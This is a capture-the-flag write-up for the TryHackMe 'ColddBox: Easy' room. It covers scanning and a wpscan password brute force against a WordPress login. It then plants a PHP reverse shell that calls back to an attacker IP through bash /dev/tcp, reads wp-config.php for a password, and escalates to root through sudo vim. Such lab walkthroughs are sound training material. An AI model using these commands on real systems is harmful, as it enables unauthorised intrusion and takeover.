# CTF-Write-up

## Try Hack Me: ColddBox: Easy

##### URL: https://tryhackme.com/room/colddboxeasy

##### Created by _https://tryhackme.com/p/Coldd_

![logo](https://user-images.githubusercontent.com/20625004/141612875-286ea779-19ce-43bd-b022-26e3c1ae5685.PNG)

You should deploy the machine first.

Add the CTF ip to your host file.

``` echo "CTF ip" >> /etc/hosts```

Run nmap against the target machine.

```nmap -sC -A  <target IP>```

Port 80 HTTP is open lets access the web app.

![webapp](https://user-images.githubusercontent.com/20625004/141612903-62b621d0-e4a1-46a4-a2fe-f55b701ca71e.PNG)

Lets use ``gobuster`` to find intersting directories and paths.

``gobuster dir -u http://<target IP> -w /usr/share/wordlist ``

![gobuster](https://user-images.githubusercontent.com/20625004/141612988-5b8a595c-1061-4787-bc07-ce922e17b5f3.PNG)

Access hidden path and we find some names. Also there is a login page and we have identified that the site is using wordpress.

![hidden](https://user-images.githubusercontent.com/20625004/141613066-e6cb15b2-7a84-49b3-ae54-46c1a47960ba.PNG)

![login](https://user-images.githubusercontent.com/20625004/141613081-260b5236-8173-4a0f-8e3d-e4be8558f8fb.PNG)

Now use ``wpscan`` tool to scan the site.

``wpscan --url http://<target IP>/wp-login.php ``

From the names of the ``hidden`` path you can use ``wpsacn`` to brute force.

``wpscan --url http://<target IP>/wp-login.php --passwords /usr/share/wordlists/wordlist --usernames <name>``

![wpascan](https://user-images.githubusercontent.com/20625004/141613265-9ea0b025-1987-4f20-bfad-f8110401d8e4.PNG)

After we were able to access the login page with the cracked username.

Digging around we are able to upload a reverse shell.

![shell](https://user-images.githubusercontent.com/20625004/141613463-aaea3c72-3d33-44ce-816f-0bf630945dbf.PNG)

``<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<Attacker IP>/4444 0>&1'");?>``

Open a listener on your machine ``nc -lvnp 4444`` and then update the file with shell and access the page to give you back the connection.

I used the ``/twentyfifteen/header.php`` for the shell.

Access the page ``http://<target IP>/wp-content/themes/twentyfifteen/header.php`` and now you have access to the machine.

![1](https://user-images.githubusercontent.com/20625004/141613571-ad605b76-d9f8-465c-b5c6-a41644beb35a.PNG)

We have no permissions lets check more.

![2](https://user-images.githubusercontent.com/20625004/141613650-5a4d8166-3cb0-4480-b291-37d5cd6f9e7a.PNG)

Access the path ``/var/www/html/`` there are some files cat ``wp-config/php``.

![3](https://user-images.githubusercontent.com/20625004/141613675-de512ab9-9873-497b-a5b8-34e8b4f5bf21.PNG)

We found a password ``su user`` and access the new user.

![4](https://user-images.githubusercontent.com/20625004/141613728-63ba08b8-a9e9-4586-ad30-560cb122d6c6.PNG)

we have our first flag.

![5](https://user-images.githubusercontent.com/20625004/141613769-60eea95c-8c8f-487c-b269-df9653d88810.PNG)

Now lets see what the user can run as root with ``sudo -l``.

![6](https://user-images.githubusercontent.com/20625004/141613804-5eeb804e-bfd9-472e-b2ce-6cf96f8330c2.PNG)

Lets use vim with the help from ``https://gtfobins.github.io/gtfobins/vim/#sudo`` 

``sudo vim -c ':!/bin/sh'``

And now we have escalted our privileges and we can find the second flag.

![7](https://user-images.githubusercontent.com/20625004/141613878-db3ab089-6472-4c30-ba5d-88f6ea6f46d8.PNG)
